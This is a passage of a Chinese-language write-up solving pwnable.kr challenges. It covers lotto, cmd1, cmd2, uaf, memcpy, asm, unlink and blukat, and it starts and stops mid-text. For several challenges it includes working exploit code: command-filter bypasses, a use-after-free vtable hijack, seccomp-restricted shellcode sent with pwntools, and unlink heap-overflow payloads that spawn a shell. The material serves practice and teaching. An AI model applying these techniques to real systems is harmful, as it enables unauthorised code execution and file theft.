total is less than dealer\u0026#39;s total, loss { printf(\u0026#34;\\nDealer Has the Better Hand. You Lose.\\n\u0026#34;); loss = loss+1; cash = cash - bet; printf(\u0026#34;\\nYou have %d Wins and %d Losses. Awesome!\\n\u0026#34;, won, loss); dealer_total=0; askover(); } 可以看到这里有一个 cash = cash - bet 的语句，当我们输入的 bet 是负数时，我们就可以让钱不减反增。也就是说，我们只需要下注 -1000000，然后故意输掉即可。\nlotto # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; unsigned char submit[6]; void play(){ int i; printf(\u0026#34;Submit your 6 lotto bytes :\u0026#34;); fflush(stdout); int r; r = read(0, submit, 6); printf(\u0026#34;Lotto Start!\\n\u0026#34;); //sleep(1); // generate lotto numbers int fd = open(\u0026#34;/dev/urandom\u0026#34;, O_RDONLY); if(fd==-1){ printf(\u0026#34;error. tell admin\\n\u0026#34;); exit(-1); } unsigned char lotto[6]; if(read(fd, lotto, 6) != 6){ printf(\u0026#34;error2. tell admin\\n\u0026#34;); exit(-1); } for(i=0; i\u0026lt;6; i++){ lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 } close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i\u0026lt;6; i++){ for(j=0; j\u0026lt;6; j++){ if(lotto[i] == submit[j]){ match++; } } } // win! if(match == 6){ system(\u0026#34;/bin/cat flag\u0026#34;); } else{ printf(\u0026#34;bad luck...\\n\u0026#34;); } } void help(){ printf(\u0026#34;- nLotto Rule -\\n\u0026#34;); printf(\u0026#34;nlotto is consisted with 6 random natural numbers less than 46\\n\u0026#34;); printf(\u0026#34;your goal is to match lotto numbers as many as you can\\n\u0026#34;); printf(\u0026#34;if you win lottery for *1st place*, you will get reward\\n\u0026#34;); printf(\u0026#34;for more details, follow the link below\\n\u0026#34;); printf(\u0026#34;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n\u0026#34;); printf(\u0026#34;mathematical chance to win this game is known to be 1/8145060.\\n\u0026#34;); } int main(int argc, char* argv[]){ // menu unsigned int menu; while(1){ printf(\u0026#34;- Select Menu -\\n\u0026#34;); printf(\u0026#34;1. Play Lotto\\n\u0026#34;); printf(\u0026#34;2. Help\\n\u0026#34;); printf(\u0026#34;3. Exit\\n\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;menu); switch(menu){ case 1: play(); break; case 2: help(); break; case 3: printf(\u0026#34;bye\\n\u0026#34;); return 0; default: printf(\u0026#34;invalid menu\\n\u0026#34;); break; } } return 0; } 很简单的彩票程序，利用伪随机数生成 6 个 1 - 45 之间的彩票号码，然后跟输入比对，如果全中则显示 flag。这个程序如此简单以至于其中的一个细节很容易被忽略：\n// calculate lotto score int match = 0, j = 0; for(i=0; i\u0026lt;6; i++){ for(j=0; j\u0026lt;6; j++){ if(lotto[i] == submit[j]){ match++; } } } 这是比对彩票号码的代码，初看之下没什么问题，但是如果让我们自己来写，正常的写法肯定是：\nfor (i = 0; i \u0026lt; 6; i++) { if (lotto[i] == submit[i]) { match++; } } 但这里却用了两层循环，并不是像我们想的那样比较对应位，而是从 lotto 和 submit 中各自任取一位，进行共 36 次比较。而对 match 的要求是 6，也就是说 36 次比较中有 6 次正确即可。\n为了让成功的机率最大，我们可以输入 6 个相同的数字 x，只要在 lotto 中有一个号码等于 x，那么我们就成功了，这个概率还是比较大的。\n需要注意的是输入的字节范围是从 \\x01 到 \\x45（-），而不是数字 1-45。\ncmd1 # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int filter(char* cmd){ int r=0; r += strstr(cmd,\u0026#34;flag\u0026#34;)!=0; r += strstr(cmd,\u0026#34;sh\u0026#34;)!=0; r += strstr(cmd,\u0026#34;tmp\u0026#34;)!=0; return r; } int main(int argc, char* argv[], char** envp){ putenv(\u0026#34;PATH=/thankyouverymuch\u0026#34;); if(filter(argv[1])) return 0; system(argv[1] ); return 0; } 需要一个命令行参数，但参数中不能包含 flag，sh 和 tmp，这个我们可以利用通配符绕过。注意到环境变量 PATH 被覆盖，因此我们调用命令时需要使用绝对路径。\n$ ./cmd1 \u0026#34;/bin/cat /home/cmd1/fla*\u0026#34; cmd2 # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int filter(char* cmd){ int r=0; r += strstr(cmd,\u0026#34;=\u0026#34;)!=0; r += strstr(cmd,\u0026#34;PATH\u0026#34;)!=0; r += strstr(cmd,\u0026#34;export\u0026#34;)!=0; r += strstr(cmd,\u0026#34;/\u0026#34;)!=0; r += strstr(cmd,\u0026#34;`\u0026#34;)!=0; r += strstr(cmd,\u0026#34;flag\u0026#34;)!=0; return r; } extern char** environ; void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p)); } int main(int argc, char* argv[], char** envp){ delete_env(); putenv(\u0026#34;PATH=/no_command_execution_until_you_become_a_hacker\u0026#34;); if(filter(argv[1])) return 0; printf(\u0026#34;%s\\n\u0026#34;, argv[1]); system(argv[1] ); return 0; } 这次删除了所有环境变量并覆盖了 PATH，同时增强了对命令行参数的过滤，关键在于 / 被过滤了，不能直接写路径。\n那么我们就需要执行系统命令来构造出 /，很容易想到 pwd 命令。我们先 cd /，此时运行 pwd 可以看到输出就是 /。\n仿照 cmd1：\n$ /home/cmd2/cmd2 \u0026#34;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*\u0026#34; 但是这样没有用，猜想是因为 $(pwd) 先被替换成 / 了，因为双引号不会忽略 $。我们用单引号就可以防止这一替换。\n$ /home/cmd2/cmd2 \u0026#39;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*\u0026#39; uaf # #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;unistd.h\u0026gt; using namespace std; class Human{ private: virtual void give_shell(){ system(\u0026#34;/bin/sh\u0026#34;); } protected: int age; string name; public: virtual void introduce(){ cout \u0026lt;\u0026lt;\u0026#34;My name is \u0026#34; \u0026lt;\u0026lt; name \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt;\u0026#34;I am \u0026#34;\u0026lt;\u0026lt; age \u0026lt;\u0026lt;\u0026#34; years old\u0026#34; \u0026lt;\u0026lt; endl; } }; class Man: public Human{ public: Man(string name, int age){ this-\u0026gt;name = name; this-\u0026gt;age = age; } virtual void introduce(){ Human::introduce(); cout \u0026lt;\u0026lt;\u0026#34;I am a nice guy!\u0026#34; \u0026lt;\u0026lt; endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-\u0026gt;name = name; this-\u0026gt;age = age; } virtual void introduce(){ Human::introduce(); cout \u0026lt;\u0026lt;\u0026#34;I am a cute girl!\u0026#34; \u0026lt;\u0026lt; endl; } }; int main(int argc, char* argv[]){ Human* m = new Man(\u0026#34;Jack\u0026#34;, 25); Human* w = new Woman(\u0026#34;Jill\u0026#34;, 21); size_t len; char* data; unsigned int op; while(1){ cout \u0026lt;\u0026lt;\u0026#34;1. use\\n2. after\\n3. free\\n\u0026#34;; cin \u0026gt;\u0026gt; op; switch(op){ case 1: m-\u0026gt;introduce(); w-\u0026gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout \u0026lt;\u0026lt;\u0026#34;your data is allocated\u0026#34; \u0026lt;\u0026lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } 本题最终肯定是要调用 Human 的 give_shell 函数，但程序不会直接调用。程序共有三种操作：\nuse: 调用 Man 和 Woman 对象的 introduce 函数 after: 从 argv[2] 中读取长为 argv[1] 的数据，放到 data 中 free: 释放 Man 和 Woman 对象的指针 我们这里可以猜想是要将 introduce 函数劫持到 give_shell 上，但是具体怎么做？注意到 give_shell 和 introduce 都是被继承的虚函数，能不能通过改变函数虚表地址来劫持函数呢？\n首先我们尝试找到 Man 的虚函数表。在 main 中找到 Man 构造函数的地址：\n注意到对象被放到 rbx 里，我们在构造函数执行后下断点，可以查看 Man 的对象：\n(gdb) b *0x400f18 (gdb) c (gdb) p/x $rbx $1 = 0x1fe8c50 (gdb) x/8 0x1fe8c50 0x1fe8c50: 0x00401570 0x00000000 0x00000019 0x00000000 0x1fe8c60: 0x01fe8c38 0x00000000 0x000203a1 0x00000000 由于虚函数表地址在对象首部，所以这里虚函数表地址就是 0x401570。我们继续看虚函数表：\n(gdb) x/8a 0x401570 0x401570 \u0026lt;_ZTV3Man+16\u0026gt;: 0x40117a \u0026lt;_ZN5Human10give_shellEv\u0026gt; 0x4012d2 \u0026lt;_ZN3Man9introduceEv\u0026gt; 0x401580 \u0026lt;_ZTV5Human\u0026gt;: 0x0 0x4015f0 \u0026lt;_ZTI5Human\u0026gt; 0x401590 \u0026lt;_ZTV5Human+16\u0026gt;: 0x40117a \u0026lt;_ZN5Human10give_shellEv\u0026gt; 0x401192 \u0026lt;_ZN5Human9introduceEv\u0026gt; 0x4015a0 \u0026lt;_ZTS5Woman\u0026gt;: 0x6e616d6f5735 0x0 用 a 可以把函数名显示出来，可以看到 Man 和 Human 的 give_shell 虚函数地址相同，而 introduce 不同，这是符合 C++ 虚函数机制的：私有虚函数不能被继承，但是会在子类的虚函数表中出现。换句话说，子类调用的本质上还是父类的虚函数。\n接下来用 IDA 分析，可以看到输入 1 的时候执行：\n也就是两个 introduce，那么这里的 v12 和 v13 就可以确定是对应于 m 和 w 的虚指针了，之后转换为指针再 + 8，正好就是调用 vtable + 8 处的函数即 introduce。那么如果我们想让它执行位于 vtable + 0 的 give_shell，只需要在这句执行前让 vtable 的值减少 8 就行了。\n而我们前面已经读到了 vtable 的值 0x401570，减 8 就是 0x401568。\n说了这么多，怎么利用 use、after 和 free 三个过程来修改 vtable 值呢？我们知道，对于一块 free 操作释放掉的内存，仍然可能存在一个指针是指向它的，这个指针一般被称作悬空指针 dangling pointer。在这里，m 和 w 就属于悬空指针。\n如果在这时，我们调用 after 过程，即分配一个等长的内存区域给 data，那么 w 所指的内存区域就会被分配。如果再次 after，那么 m 所指的内存区域也会被分配，这是由 new/malloc 的性质决定的。\n现在，假如我们给 data 写入的是 0x401568，并且调用 use 过程，那么就会执行 m-\u0026gt;introduce()，这会访问到 0x401568 + 8 = 0x401570 处的函数指针，恰好是 m 的 vtable + 0 处，也就变成了 m-\u0026gt;give_shell()。\n那么只剩下一个问题了，就是我们要分配多大的空间给 data，这在 IDA 中很容易发现：\n0x18 字节，也就是 24 字节。最终 payload（注意地址是三十二位的）：\n$ python -c \u0026#39;print\u0026#34;\\x68\\x15\\x40\u0026#34;+\u0026#34;\\x00\u0026#34;*5\u0026#39; \u0026gt; /tmp/payload $ ./uaf 24 /tmp/payload 1. use 2. after 3. free 3 1. use 2. after 3. free 2 your data is allocated 1. use 2. after 3. free 2 your data is allocated 1. use 2. after 3. free 1 memcpy # // compiled with : gcc -o memcpy memcpy.c -m32 -lm #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;math.h\u0026gt; unsigned long long rdtsc(){ asm(\u0026#34;rdtsc\u0026#34;); } char* slow_memcpy(char* dest, const char* src, size_t len){ int i; for (i=0; i\u0026lt;len; i++) { dest[i] = src[i]; } return dest; } char* fast_memcpy(char* dest, const char* src, size_t len){ size_t i; // 64-byte block fast copy if(len\u0026gt;= 64){ i = len / 64; len \u0026amp;= (64-1); while(i--\u0026gt; 0){ __asm__ __volatile__ ( \u0026#34;movdqa (%0), %%xmm0\\n\u0026#34; \u0026#34;movdqa 16(%0), %%xmm1\\n\u0026#34; \u0026#34;movdqa 32(%0), %%xmm2\\n\u0026#34; \u0026#34;movdqa 48(%0), %%xmm3\\n\u0026#34; \u0026#34;movntps %%xmm0, (%1)\\n\u0026#34; \u0026#34;movntps %%xmm1, 16(%1)\\n\u0026#34; \u0026#34;movntps %%xmm2, 32(%1)\\n\u0026#34; \u0026#34;movntps %%xmm3, 48(%1)\\n\u0026#34; ::\u0026#34;r\u0026#34;(src),\u0026#34;r\u0026#34;(dest):\u0026#34;memory\u0026#34;); dest += 64; src += 64; } } // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest; } int main(void){ setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(\u0026#34;Hey, I have a boring assignment for CS class.. :(\\n\u0026#34;); printf(\u0026#34;The assignment is simple.\\n\u0026#34;); printf(\u0026#34;-----------------------------------------------------\\n\u0026#34;); printf(\u0026#34;- What is the best implementation of memcpy? -\\n\u0026#34;); printf(\u0026#34;- 1. implement your own slow/fast version of memcpy -\\n\u0026#34;); printf(\u0026#34;- 2. compare them with various size of data -\\n\u0026#34;); printf(\u0026#34;- 3. conclude your experiment and submit report -\\n\u0026#34;); printf(\u0026#34;-----------------------------------------------------\\n\u0026#34;); printf(\u0026#34;This time, just help me out with my experiment and get flag\\n\u0026#34;); printf(\u0026#34;No fancy hacking, I promise :D\\n\u0026#34;); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e\u0026lt;14; e++){ // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf(\u0026#34;specify the memcpy amount between %d ~ %d :\u0026#34;, low, high); scanf(\u0026#34;%d\u0026#34;, \u0026amp;size); if(size \u0026lt; low || size\u0026gt; high ){ printf(\u0026#34;don\u0026#39;t mess with the experiment.\\n\u0026#34;); exit(0); } sizes[i++] = size; } sleep(1); printf(\u0026#34;ok, lets run the experiment with your configuration\\n\u0026#34;); sleep(1); // run experiment for(i=0; i\u0026lt;10; i++){ size = sizes[i]; printf(\u0026#34;experiment %d : memcpy with buffer size %d\\n\u0026#34;, i+1, size); dest = malloc(size); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf(\u0026#34;ellapsed CPU cycles for slow_memcpy : %llu\\n\u0026#34;, t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf(\u0026#34;ellapsed CPU cycles for fast_memcpy : %llu\\n\u0026#34;, t2-t1); printf(\u0026#34;\\n\u0026#34;); } printf(\u0026#34;thanks for helping my experiment!\\n\u0026#34;); printf(\u0026#34;flag : ----- erased in this source code -----\\n\u0026#34;); return 0; } 本题实现了一个针对 64 字节以上的块的快速 memcpy 方法，使用的是 movdqa 和 movntps 两个汇编指令。但是实际运行时，即使按要求输入合法数据，程序也会崩溃。查了 一些资料 后，发现是由于堆分配时字节没有对齐导致的：\nThe memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.\n显然这里是要求目的地址是 16 字节对齐的，换句话说它的十六进制末尾是 0。gdb 调试一下，全部输入最小的合法数据：\n可以看到段错误的时候，目的寄存器 edx 的末尾并不是 0，因此产生了错误。这不难理解：malloc 进行堆分配时，对于 8 而言分配了 0x8+0x8=0x10 字节，是对齐的；对 16 而言分配了 0x8+0x10=0x18 字节，于是不对齐了，我们可以给它 + 8 来对齐。对于 32，分配 0x8+0x20=0x28 字节，同样不对齐，我们也作同样的 padding 处理，于是我们可以输入数据：\n8 24 40 72 136 264 520 1032 2056 4104 使得每次 edx 都是对齐的，程序就不会段错误了，最终得到 flag。\nasm # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;seccomp.h\u0026gt; #include \u0026lt;sys/prctl.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define LENGTH 128 void sandbox(){ scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) { printf(\u0026#34;seccomp error\\n\u0026#34;); exit(0); } seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) \u0026lt;0){ seccomp_release(ctx); printf(\u0026#34;seccomp error\\n\u0026#34;); exit(0); } seccomp_release(ctx); } char stub[] =\u0026#34;\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\x31\\xff\\x48\\x31\\xed\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff\u0026#34;; unsigned char filter[256]; int main(int argc, char* argv[]){ setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(\u0026#34;Welcome to shellcoding practice challenge.\\n\u0026#34;); printf(\u0026#34;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\\n\u0026#34;); printf(\u0026#34;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\\n\u0026#34;); printf(\u0026#34;If this does not challenge you. you should play\u0026#39;asg\u0026#39;challenge :)\\n\u0026#34;); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub); printf(\u0026#34;give me your x64 shellcode:\u0026#34;); read(0, sh+offset, 1000); alarm(10); chroot(\u0026#34;/home/asm_pwn\u0026#34;); // you are in chroot jail. so you can\u0026#39;t use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0; } 程序通过 sandbox 函数和 chroot 禁止我们使用符号链接和除了 open, read, write 之外的函数，同时题目给出了一个 readme：\nonce you connect to port 9026, the \u0026#34;asm\u0026#34; binary will be executed under asm_pwn privilege. make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory) flag 的文件名是一个已知的非常长的字符串。\n根据提示，我们知道我们需要写一段 shellcode，并通过最后的 ((void (*)(void))sh)(); 执行。在执行前，程序还会执行一段汇编代码，也就是这里的 stub 数组中的内容，利用 pwntools 的 disasm 工具得到汇编代码：\n0: 48 dec eax 1: 31 c0 xor eax,eax 3: 48 dec eax 4: 31 db xor ebx,ebx 6: 48 dec eax 7: 31 c9 xor ecx,ecx 9: 48 dec eax a: 31 d2 xor edx,edx c: 48 dec eax d: 31 f6 xor esi,esi f: 48 dec eax 10: 31 ff xor edi,edi 12: 48 dec eax 13: 31 ed xor ebp,ebp 15: 4d dec ebp 16: 31 c0 xor eax,eax 18: 4d dec ebp 19: 31 c9 xor ecx,ecx 1b: 4d dec ebp 1c: 31 d2 xor edx,edx 1e: 4d dec ebp 1f: 31 db xor ebx,ebx 21: 4d dec ebp 22: 31 e4 xor esp,esp 24: 4d dec ebp 25: 31 ed xor ebp,ebp 27: 4d dec ebp 28: 31 f6 xor esi,esi 2a: 4d dec ebp 2b: 31 ff xor edi,edi 这里把所有寄存器都清零了，这样实际上更方便我们写 shellcode。\n考虑如何用系统调用读取文件并显示出来：\nfd = open(filepath, O_RDONLY); read(fd, buf, 100); write(1, buf, 100); // stdout 然后我们利用 pwntools 的 shellcraft 模块，将上面的代码转化成汇编即可。我们要取得 fd 也就是 open 的返回值，显然在 rax 里；然后从 rax 中读取 flag 内容，放到栈上，也就是 rsp 上：\nfrom pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;DEBUG\u0026#39;) p = remote(\u0026#39;pwnable.kr\u0026#39;, 9026) shellcode = shellcraft.open(\u0026#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\u0026#39;, 0) shellcode += shellcraft.read(\u0026#39;rax\u0026#39;, \u0026#39;rsp\u0026#39;, 100) shellcode += shellcraft.write(1,\u0026#39;rsp\u0026#39;, 100) p.recvuntil(\u0026#39;shellcode:\u0026#39;) p.sendline(asm(shellcode)) p.interactive() unlink # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; typedef struct tagOBJ{ struct tagOBJ* fd; struct tagOBJ* bk; char buf[8]; }OBJ; void shell(){ system(\u0026#34;/bin/sh\u0026#34;); } void unlink(OBJ* P){ OBJ* BK; OBJ* FD; BK=P-\u0026gt;bk; FD=P-\u0026gt;fd; FD-\u0026gt;bk=BK; BK-\u0026gt;fd=FD; } int main(int argc, char* argv[]){ malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A \u0026lt;-\u0026gt; B \u0026lt;-\u0026gt; C A-\u0026gt;fd = B; B-\u0026gt;bk = A; B-\u0026gt;fd = C; C-\u0026gt;bk = B; printf(\u0026#34;here is stack address leak: %p\\n\u0026#34;, \u0026amp;A); printf(\u0026#34;here is heap address leak: %p\\n\u0026#34;, A); printf(\u0026#34;now that you have leaks, get shell!\\n\u0026#34;); // heap overflow! gets(A-\u0026gt;buf); // exploit this unlink! unlink(B); return 0; } 题目提供了指针 A 在栈上的地址和其所指对象在堆上的地址，随后出现了一个堆溢出漏洞，显然是要我们溢出 A 的 buf 去覆盖 B 的内容，然后 unlink(B)。\nunlink 函数的原理和双向链表中删除结点是一样的，不规范地缩写一下：\n[P-\u0026gt;fd]-\u0026gt;bk = P-\u0026gt;bk [P-\u0026gt;bk]-\u0026gt;fd = P-\u0026gt;fd 然而，尽管 P-\u0026gt;fd-\u0026gt;bk 和 P-\u0026gt;bk-\u0026gt;fd 会被检查合法性，这两句赋值语句中的 P-\u0026gt;fd 和 P-\u0026gt;bk 都不会被检查，换句话说我们可以用这个特性使右边的地址覆盖掉左边地址。\n再简单一点，注意到 -\u0026gt;fd 等于 +0x0，-\u0026gt;bk 等于 +0x4，也就是：\n[P]+0x4 = P+0x4 [P+0x4] = P 例如，我们可以修改 main 返回地址：ret_addr = shell_addr，也就是令 P-\u0026gt;fd=ebp, P-\u0026gt;bk=shell_addr（注意到 [P-\u0026gt;fd]-\u0026gt;bk=ebp+4）。然而，当执行下一句时，有 [P-\u0026gt;bk]-\u0026gt;fd=*(shell_addr)=shell()，会被 P-\u0026gt;fd 也就是 ebp 覆盖掉，导致我们的 shell() 函数被修改。反之同理。\n或者，我们可以往栈上写 shell() 或者 GOT 劫持，由于 NX 保护和库函数缺失，这里也不能用。\n最后，我们先找到了 shell() 地址 0x80484eb，随后在汇编中发现关键代码：\nmov ecx, [ebp-0x4] leave lea esp, [ecx-0x4] retn 这里的代码逻辑很奇怪：leave 已经恢复 esp 了，下一句又改变了 esp 的值。换个写法：\necx = [ebp-0x4] esp = ecx-0x4 eip = esp 这样就很清晰了，我们可以通过影响 esp 来影响返回地址，这就需要我们控制 ecx。控制 ecx，也就是控制 [ebp-0x4]。\n那我们最终肯定是要让 esp = shell_addr，为了产生这个 shell_addr，首先要把 shell() 写入堆上的某个安全（不会被修改）的地方，显然 A-\u0026gt;buf 开头是非常理想的位置。\n此时有 shell_addr = A+0x8（两个指针 8 字节），那就要让 esp = ecx-0x4 = A+0x8，得 ecx = A+0xc。\n这需要 [ebp-0x4] = A+0xc，这就到了 unlink 出场的时候了。我们设置 B-\u0026gt;bk 为 ebp-0x4，B-\u0026gt;fd 为 A+0xc，按照前面说的原理就能实现覆盖（注：此时 A-\u0026gt;buf[4:8] 被修改，这不会有影响），此时堆长这样（每块 4 字节）：\n--------- | A-\u0026gt;fd | --------- | A-\u0026gt;bk | --------- | shell() | // A-\u0026gt;buf[0:4] --------- | | // A-\u0026gt;buf[4:8] --------- | A+0xc | // B-\u0026gt;fd --------- | ebp-0x4 | // B-\u0026gt;bk --------- | B-\u0026gt;buf | ... 问题来了：\n上面的 A 是 A 的栈地址还是 A 所指对象的堆地址？ 如何得到 ebp-0x4？ 第一个问题很容易，我们最终需要获取的内容是 shell()，这个东西被我们放在了 A 所指的 OBJ 对象里，所以我们去拿 A+0x8 很明显是指 A 的堆地址，也就是 heap address leak。\n第二个问题，题目给的 stack_leak 我们似乎还没有用，怎么用呢？因为我们需要用 A 在栈上的地址找到 ebp-0x4 的值，所以计算一下两者的偏移量即可。在汇编代码中可以找到 A,B,C 分别位于 ebp-0x14, ebp-0xc, ebp-0x10 的位置，那就可以推出 ebp-0x4 = (ebp-0x14) + 0x10 = stack address leak + 0x10。\n最终 payload：\nfrom pwn import * p = ssh(host=\u0026#39;pwnable.kr\u0026#39;, port=2222, user=\u0026#39;unlink\u0026#39;, password=\u0026#39;guest\u0026#39;).process(\u0026#39;./unlink\u0026#39;) p.recvuntil(\u0026#39;stack address leak:\u0026#39;) stack_leak = int(p.recv(10), 16) p.recvuntil(\u0026#39;heap address leak:\u0026#39;) heap_leak = int(p.recv(9), 16) shell_addr = 0x80484eb payload = p32(shell_addr) + \u0026#39;a\u0026#39;*12 + p32(heap_leak+0xc) + p32(stack_leak+0x10) p.send(payload) p.interactive() 此外，我们刚才仅仅利用了第二句话 [P-\u0026gt;bk]-\u0026gt;fd = P-\u0026gt;fd，另一句话并没有用。那能不能只用另一句话 [P-\u0026gt;fd]-\u0026gt;bk = P-\u0026gt;bk 来完成这题呢？当然是可以的。实际上，区别很微妙。\n这里不同于刚才控制 [ebp-0x4] 修改 ecx 的思路，而是直接想办法修改 ebp 引起 ecx 变化，目标还是让 [ebp-0x4]=A+0xc。\n令 P-\u0026gt;fd = ebp-0x8，P-\u0026gt;bk = A+0xc，则我们会发现 [P-\u0026gt;fd]-\u0026gt;bk 指向 ecx，此时我们又能用 A+0xc 覆盖 ecx 了！\n--------- | ebp-0x8 | // B-\u0026gt;fd --------- | A+0xc | // B-\u0026gt;bk --------- 根据刚才得到的栈上关系，ebp-0x8 = stack address leak + 0xc，因此第二种方法的 payload：\npayload = p32(shell_addr) + \u0026#39;a\u0026#39;*12 + p32(stack_leak+0xc) + p32(heap_leak+0xc) blukat # 这题只有三分，但是代码中并没有什么可利用的点：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; char flag[100]; char password[100]; char* key = \u0026#34;3\\rG[S/%\\x1c\\x1d#0?\\rIS\\x0f\\x1c\\x1d\\x18;,4\\x1b\\x00\\x1bp;5\\x0b\\x1b\\x08\\x45+\u0026#34;; void calc_flag(char* s){ int i; for(i=0; i\u0026lt;strlen(s); i++){ flag[i] = s[i] ^ key[i]; } printf(\u0026#34;%s\\n\u0026#34;, flag); } int main(){ FILE* fp = fopen(\u0026#34;/home/blukat/password\u0026#34;, \u0026#34;r\u0026#34;); fgets(password, 100, fp); char buf[100]; printf(\u0026#34;guess the password!\\n\u0026#34;); fgets(buf, 128, stdin); if(!strcmp(password, buf)){ printf(\u0026#34;congrats! here is your flag:\u0026#34;); calc_flag(password); } else{ printf(\u0026#34;wrong guess!\\n\u0026#34;); exit(0); } return 0; } 这里就是要求输入 password 并和同目录的 password 文件比对，相同则输出 flag。直接 cat password，显示无权限：\ncat: password: Permission denied 由于没有可利用的点并且分很低，结合提示可以想到不是常规思路能解决的题。注意到 blukat.c 这个程序明显是可以读 password 文件的，我们可以查看一下该文件的权限：\n$ ls -al total 36 drwxr-x--- 4 root blukat 4096 Aug 16 2018 . drwxr-xr-x 114 root root 4096 May 19 15:59 .. -r-xr-sr-x 1 root blukat_pwn 9144 Aug 8 2018 blukat -rw-r--r-- 1 root root 645 Aug 8 2018 blukat.c dr-xr-xr-x 2 root root 4096 Aug 16 2018 .irssi -rw-r----- 1 root blukat_pwn 33 Jan 6 2017 password drwxr-xr-x 2 root root 4096 Aug 16 2018 .pwntools-cache 需要是 blukat_pwn 组的用户才能够读，那么我们是以什么用户登录的呢？\n$ id uid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn) 可以看到我们确实是属于 blukat_pwn 组的，但是却提示无权读取，那么只有一种可能，就是 password 文件本身的内容就是：\ncat: password: Permission denied 输入进程序就能得到 flag。\nhorcruxes # IDA 一下 ropme 函数：\nint ropme() { char s[100]; // [esp+4h] [ebp-74h] int v2; // [esp+68h] [ebp-10h] int fd; // [esp+6Ch] [ebp-Ch] printf(\u0026#34;Select Menu:\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v2); getchar(); if (v2 == a) { A(); } else if (v2 == b) { B(); } else if (v2 